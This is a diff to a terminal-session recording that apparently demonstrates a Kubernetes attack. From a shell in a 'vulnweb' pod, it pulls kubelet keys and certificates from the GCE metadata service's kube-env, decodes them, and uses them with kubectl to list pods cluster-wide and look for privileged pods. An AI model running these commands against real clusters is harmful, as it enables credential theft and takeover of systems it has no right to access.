@@ -11,155 +11,15 @@
   },
   "stdout": [
     [
-      0.176205,
-      "\u001b[?1034h\u001b]0;geese@mb: ~\u0007\u001b[0;32m~\u001b[0m$ "
-    ],
-    [
-      0.47764,
-      "ku"
-    ],
-    [
-      6.8e-05,
-      "bectl"
-    ],
-    [
-      3.1e-05,
-      " e"
-    ],
-    [
-      2.7e-05,
-      "xe"
-    ],
-    [
-      3.4e-05,
-      "c"
-    ],
-    [
-      4e-05,
-      " -"
-    ],
-    [
-      0.000124,
-      "it "
-    ],
-    [
-      6.4e-05,
-      "vul"
-    ],
-    [
-      5e-05,
-      "nw"
-    ],
-    [
-      4.1e-05,
-      "eb"
-    ],
-    [
-      4.8e-05,
-      "-2"
-    ],
-    [
-      0.000169,
-      "5"
-    ],
-    [
-      5.4e-05,
-      "699414"
-    ],
-    [
-      9.6e-05,
-      "0"
-    ],
-    [
-      4.2e-05,
-      "5-qg"
-    ],
-    [
-      8.6e-05,
-      "p"
-    ],
-    [
-      4.4e-05,
-      "g1"
-    ],
-    [
-      3.5e-05,
-      " "
-    ],
-    [
-      4.3e-05,
-      "/"
-    ],
-    [
-      3.7e-05,
-      "b"
-    ],
-    [
-      4.4e-05,
-      "in"
-    ],
-    [
-      3.5e-05,
-      "/"
-    ],
-    [
-      4e-05,
-      "b"
-    ],
-    [
-      0.000357,
-      "a"
-    ],
-    [
-      5.4e-05,
-      "sh\r\n"
-    ],
-    [
-      0.417017,
-      "root@vulnweb-2569941405-qgpg1:/# "
-    ],
-    [
-      0.000295,
-      "export TERM=xterm\r\nroot@vulnweb-2569941405-qgpg1:/# cl"
-    ],
-    [
-      0.000361,
-      "\r\u001b[Kroot@vulnweb-2569941405-qgpg1:/# clear"
-    ],
-    [
-      0.74242,
+      0.165407,
       "\r\n\u001b[3;J\u001b[H\u001b[2Jroot@vulnweb-2569941405-qgpg1:/# "
     ],
     [
-      0.732557,
-      "c"
-    ],
-    [
-      0.15589,
-      "l"
-    ],
-    [
-      0.079359,
-      "e"
-    ],
-    [
-      0.066938,
-      "a"
-    ],
-    [
-      0.091257,
-      "r"
-    ],
-    [
-      0.865407,
-      "\r\n\u001b[3;J\u001b[H\u001b[2Jroot@vulnweb-2569941405-qgpg1:/# "
-    ],
-    [
-      2.0,
+      1.0,
       "curl -s -H \"X-Google-Metadata-Request: True\" http://metad \rata.google.internal/0.1/meta-data/attributes/"
     ],
     [
-      1.14438,
+      4.0,
       "\r\n"
     ],
     [
@@ -395,7 +255,7 @@
       "T"
     ],
     [
-      0.138055,
+      1.138055,
       "\r\n"
     ],
     [
@@ -411,7 +271,7 @@
       "heWpwdWMvWUw5elhrb0UxdmxCCjhoM1Zrb0NZOHpFcnJ6ckVlS0I2ME9BNmZsNFBCN2JUd3F2Z0lDSXJpWDNuRzYzbVAyYUV2WERjQUJ6UWh3UGoKVUpKa0NZdHZIVzU2VjlmY0xqZWIwZkxWVkNqdXNNaVRpZExnZ1F6dFBwQWxFb0xHV012REx5U2N1VW5wL3Q3TgpIRTBwdDdVUU1hR2IxY0JXbnJyRnh4a2hLdVhoVHFEajU0OUFoZlRST2V4VHJwY2hQQzJJbHdRVEVxS1FYa2g2CnBqV3pDUUlEQVFBQm94QXdEakFNQmdOVkhSTUJBZjhFQWpBQU1BMEdDU3FHU0liM0RRRUJDd1VBQTRJQkFRQ1kKWDZzaEFjKzVRcTdhc2RUL3I5VHVLbTZ2L2dYWEhMRy9sWmw3OTNyTHd4VUowanNQcVVoM2hJeGFIemI4VlVEWQpoR2dycEdONTJnN2Nrem05Unk3cDNXZ1ZPbkFCYTB4bldVRkErNEg1UC9ZMGZFaGxCU25ORXZpVUZSdytabVdxCnBka3IwR2lLMStVbGF4RUFaZWIvRkxGV015RFRFZXRIdXlFVDlrMW5vdFhRTE5iaVdNZ3ZBTEhPS2FTVnJJSkYKMGhCaXVKaXE5WnFPaEVRdXlwMllqdWxaZXpJcnU3UHB3NVpBaXFxRFV5azNVK3dxZ3ZyV3hmbEhmZ09xa0VlNwpOcjRFb09ESUJZWUNRRnZXSlUwTFhHYXh3VUkvNkdRNjJUMTNFb3dnWEdIZWUvQjNWZ041RWVtV1lxSmMrcEliCjlKbHJnanJkYUhVRzFTb1dkczQwCi0tLS0tRU5EIENFUlRJRklDQVRFLS0tLS0K\r\nroot@vulnweb-2569941405-qgpg1:/# "
     ],
     [
-      0.410431,
+      0.810431,
       "curl -s -H \"X-Google-Metadata-Request: True\" http://metada\rata.google.internal/0.1/meta-data/attributes/kube-env | grep CERT"
     ],
     [
@@ -483,7 +343,7 @@
       "\r\n\u001b[3;J\u001b[H\u001b[2Jroot@vulnweb-2569941405-qgpg1:/# "
     ],
     [
-      2.0,
+      1.0,
       "curl -sLO https://storage.googleapis.com/kubernetes-relea \rse/release/$(curl -s https://storage.goo"
     ],
     [
@@ -503,7 +363,7 @@
       "e.txt) \r/bin/linux/amd64/kubectl && chmod +x kubectl && mv kubectl /usr/local/bin && curl -s -H \"X \r-Google-Metadata-Request: True\" http://metadata.google.internal/computeMetadata/v1/instanc \re/attributes/kube-env | sed -e 's/^/export /g' | sed -e 's/: /=/g' | grep -v \"EVICTION_HAR \rD\" | grep -v \"EXTRA_DOCKER_OPTS\" > kube-env.sh && . kube-env.sh && echo $KUBELET_KEY | bas \re64 -d > client.pem && echo $KUBELET_CERT | base64 -d > client.crt && echo $CA_CERT | base \r64 -d > ca.crt && kubectl --certificate-authority=ca.crt --client-key=client.pem --client- \rcertificate=client.crt --server https://$KUBERNETES_MASTER_NAME get pods --all-namespaces"
     ],
     [
-      0.980443,
+      5.980443,
       "\r\n"
     ],
     [
@@ -747,7 +607,7 @@
       "root@vulnweb-2569941405-qgpg1:/# "
     ],
     [
-      2.0,
+      4.0,
       "c"
     ],
     [
@@ -791,187 +651,11 @@
       "root@vulnweb-2569941405-qgpg1:/# "
     ],
     [
-      2.0,
-      "kubectl --ce"
-    ],
-    [
-      8.5e-05,
-      "r"
-    ],
-    [
-      0.004138,
-      "tificate-authority=ca.crt --client-key=clien \rt.pem --client-certificate=client.crt --server https://$KUBERNETES_MASTER_NAME get pod ngi \rnx -n kube-system | grep priv"
-    ],
-    [
-      0.877658,
-      "\r\n"
-    ],
-    [
-      0.197148,
-      "root@vulnweb-2569941405-qgpg1:/# "
-    ],
-    [
-      2.0,
-      "kubectl --certificate-authority=ca.crt --client-key=client\rt.pem --client-certificate=client.crt --server https://$KUBERNETES_MASTER_NAME get pod ngin\rnx -n kube-system | grep priv"
-    ],
-    [
-      0.74128,
-      "\b\u001b[K"
-    ],
-    [
-      0.582552,
-      "\b\u001b[K"
-    ],
-    [
-      0.034978,
-      "\b\u001b[K"
-    ],
-    [
-      0.033376,
-      "\b\u001b[K"
-    ],
-    [
-      0.035332,
-      "\b\u001b[K"
-    ],
-    [
-      0.03625,
-      "\b\u001b[K"
-    ],
-    [
-      0.032901,
-      "\b\u001b[K"
-    ],
-    [
-      0.034677,
-      "\b\u001b[K"
-    ],
-    [
-      0.032484,
-      "\b\u001b[K"
-    ],
-    [
-      0.034062,
-      "\b\u001b[K"
-    ],
-    [
-      0.034945,
-      "\b\u001b[K"
-    ],
-    [
-      0.038829,
-      "\b\u001b[K"
-    ],
-    [
-      0.464603,
-      "\r\n"
-    ],
-    [
-      0.190417,
-      "NAME      READY     STATUS"
-    ],
-    [
-      0.000305,
-      "    RESTARTS   AGE\r\nnginx     1/1       Running   0          26s\r\n"
-    ],
-    [
-      0.00212,
-      "root@vulnweb-2569941405-qgpg1:/# "
-    ],
-    [
       0.850582,
-      "kubectl --certificate-authority=ca.crt --client-key=client\rt.pem --client-certificate=client.crt --server https://$KUBERNETES_MASTER_NAME get pod ngin\rnx -n kube-system"
+      "kubectl --certificate-authority=ca.crt --client-key=client\rt.pem --client-certificate=client.crt --server https://$KUBERNETES_MASTER_NAME get pod ngin\rnx -n kube-system -o yaml | grep priv"
     ],
     [
-      0.970098,
-      " | grep priv"
-    ],
-    [
-      0.54084,
-      "\b"
-    ],
-    [
-      0.586953,
-      "\b"
-    ],
-    [
-      0.037027,
-      "\b"
-    ],
-    [
-      0.039112,
-      "\b"
-    ],
-    [
-      0.03359,
-      "\b"
-    ],
-    [
-      0.036648,
-      "\b"
-    ],
-    [
-      0.035377,
-      "\b"
-    ],
-    [
-      0.032305,
-      "\b"
-    ],
-    [
-      0.033658,
-      "\b"
-    ],
-    [
-      0.036587,
-      "\b"
-    ],
-    [
-      0.036741,
-      "\b"
-    ],
-    [
-      0.182567,
-      "\b"
-    ],
-    [
-      0.260354,
-      "\u001b[C"
-    ],
-    [
-      0.652178,
-      "\u001b[1@-"
-    ],
-    [
-      0.223474,
-      "\u001b[1@o"
-    ],
-    [
-      0.170293,
-      "\u001b[1@ "
-    ],
-    [
-      0.14603,
-      "\u001b[1@y"
-    ],
-    [
-      0.112577,
-      "\u001b[1@a"
-    ],
-    [
-      0.111565,
-      "\u001b[1@m"
-    ],
-    [
-      0.13631,
-      "\u001b[1@l"
-    ],
-    [
-      0.123748,
-      "\u001b[1@ "
-    ],
-    [
-      0.226257,
+      0.826257,
       "\r\n"
     ],
     [
@@ -981,14 +665,6 @@
     [
       0.013311,
       "root@vulnweb-2569941405-qgpg1:/# "
-    ],
-    [
-      2.0,
-      "exit\r\n"
-    ],
-    [
-      0.039112,
-      "\u001b]0;geese@mb: ~\u0007\u001b[0;32m~\u001b[0m$ "
     ]
   ]
 }
